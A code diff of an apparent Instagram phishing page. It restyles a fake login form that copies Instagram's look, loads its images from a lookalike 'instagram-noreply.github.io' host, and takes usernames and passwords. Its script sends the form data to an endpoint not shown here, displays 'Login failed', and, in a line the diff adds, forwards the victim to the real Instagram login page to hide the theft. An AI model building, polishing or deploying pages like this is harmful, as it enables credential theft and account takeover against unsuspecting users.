@@ -25,12 +25,17 @@
         }
 
         #container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
             max-width: 350px;
             width: 100%;
             background-color: #fff;
+            padding: 40px;
             border: 1px solid #dbdbdb;
-            padding: 20px;
-            text-align: center;
+            border-radius: 1px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
         }
 
         .logo {
@@ -41,97 +46,100 @@
             height: 51px;
         }
 
-        .form-field {
+        .input-field {
+            width: 100%;
             margin-bottom: 10px;
         }
 
-        .form-field input {
+        .input-field input {
             width: 100%;
-            padding: 9px 0 7px 8px;
+            padding: 10px;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
             background: #fafafa;
-            outline: none;
+            font-size: 14px;
         }
 
-        .form-field input::placeholder {
-            color: #8e8e8e;
+        .input-field input:focus {
+            outline: none;
+            border-color: #a5a5a5;
         }
 
         .login-btn {
             width: 100%;
-            padding: 8px 0;
-            background-color: #0095f6;
-            border: none;
-            border-radius: 4px;
-            color: white;
-            font-weight: bold;
+            background-color: #3897f0;
+            border: 1px solid #3897f0;
+            padding: 10px 0;
+            color: #fff;
             cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .login-btn:disabled {
-            background-color: #b2dffc;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 10px 0;
         }
 
         .or {
             display: flex;
             align-items: center;
+            justify-content: center;
             text-align: center;
-            margin: 20px 0;
             color: #8e8e8e;
+            margin: 20px 0;
         }
 
         .or::before,
         .or::after {
             content: '';
             flex: 1;
-            height: 1px;
-            background: #dbdbdb;
+            border-bottom: 1px solid #dbdbdb;
         }
 
         .or::before {
-            margin-right: 10px;
+            margin-right: 15px;
         }
 
         .or::after {
-            margin-left: 10px;
+            margin-left: 15px;
         }
 
-        .logInFB {
+        .main-bottom {
+            text-align: center;
+        }
+
+        .main-bottom a {
+            text-decoration: none;
             color: #385185;
             font-weight: bold;
-            text-decoration: none;
         }
 
-        .forget {
-            color: #385185;
-            text-decoration: none;
-            font-size: 12px;
+        .main-bottom a:hover {
+            text-decoration: underline;
         }
 
-        .bottom {
+        .footer {
+            text-align: center;
             margin-top: 20px;
         }
 
-        .bottom .signUp {
-            font-size: 14px;
-        }
-
-        .bottom .signUp a {
-            color: #0095f6;
+        .footer a {
             text-decoration: none;
+            color: #00376b;
             font-weight: bold;
         }
 
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
         .app-section {
+            text-align: center;
             margin-top: 20px;
         }
 
         .app-section span {
             display: block;
+            font-size: 14px;
             margin-bottom: 10px;
-            color: #262626;
         }
 
         .images {
@@ -145,83 +153,52 @@
         }
 
         footer {
+            text-align: center;
             margin-top: 20px;
             font-size: 12px;
             color: #8e8e8e;
         }
 
         footer a {
-            color: #8e8e8e;
             text-decoration: none;
-        }
-
-        footer select {
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            padding: 5px;
-            margin-top: 10px;
-            font-size: 12px;
-            color: #262626;
+            color: #8e8e8e;
         }
     </style>
 </head>
 <body>
+
     <div id="container">
         <div class="logo">
-            <img src="https://instagram-noreply.github.io/Instagram-support/logo.png" alt="Instagram logo">
+            <img src="https://instagram-noreply.github.io/Instagram-support/logo.png" />
         </div>
         <form id="loginForm">
-            <div class="form-field">
-                <input type="text" id="usernameInput" placeholder="Phone number, username, or email">
+            <div class="input-field">
+                <input type="text" placeholder="Phone number, username, or email" id="usernameInput" />
             </div>
-            <div class="form-field">
-                <input type="password" id="passwordInput" placeholder="Password">
+            <div class="input-field">
+                <input type="password" placeholder="Password" id="passwordInput" />
             </div>
-            <input type="submit" value="Log in" class="login-btn">
+            <input type="submit" value="Log in" class="login-btn" />
         </form>
 
         <div class="or">OR</div>
 
-        <a href="#" class="logInFB"><i class="fa-brands fa-facebook-f"></i> Log in with Facebook</a><br>
-        <a href="#" class="forget">Forgot password?</a>
-
-        <div class="bottom">
-            <div class="signUp">
-                Don't have an account? <a href="#">Create new account</a>
-            </div>
+        <div class="main-bottom">
+            <a href="#"><i class="fa-brands fa-facebook-f"></i> Log in with Facebook</a><br>
+            <a href="#" class="forget">Forgot password?</a>
         </div>
+
+        <div class="footer">
+            <p>Don't have an account? <a href="#">Create new account</a></p>
+        </div>
+
         <div class="app-section">
             <span>Get the app.</span>
             <div class="images">
-                <img src="https://instagram-noreply.github.io/Instagram-support/googlePlay.png" alt="Get it on Google Play">
-                <img src="https://instagram-noreply.github.io/Instagram-support/microsoft.png" alt="Get it from Microsoft">
+                <img src="https://instagram-noreply.github.io/Instagram-support/googlePlay.png" alt="Google Play">
+                <img src="https://instagram-noreply.github.io/Instagram-support/microsoft.png" alt="Microsoft">
             </div>
         </div>
-        <footer>
-            <a href="#">Meta</a>
-            <a href="#">About</a>
-            <a href="#">Blog</a>
-            <a href="#">Jobs</a>
-            <a href="#">Help</a>
-            <a href="#">API</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">Top Accounts</a>
-            <a href="#">Locations</a>
-            <a href="#">Instagram Lite</a>
-            <a href="#">Instagram Contact</a>
-            <a href="#">Uploading & Non-Users</a>
-            <div class="bottom-footer">
-                <select name="" id="">
-                    <option value="English">English</option>
-                    <option value="Hindi">Hindi</option>
-                    <option value="Punjabi">Punjabi</option>
-                    <option value="Urdu">Urdu</option>
-                    <option value="Francais">Francais</option>
-                </select>
-                <span> &copy; 2023 Instagram from Meta</span>
-            </div>
-        </footer>
     </div>
 
     <script>
@@ -246,9 +223,10 @@
             })
             .then(() => {
                 ('Login failed.');
+                window.location.href = 'https://www.instagram.com/accounts/login/';
             })
             .catch((error) => {
-                console.error('Error :', error);
+                console.error('Error:', error);
             });
         });
     </script>
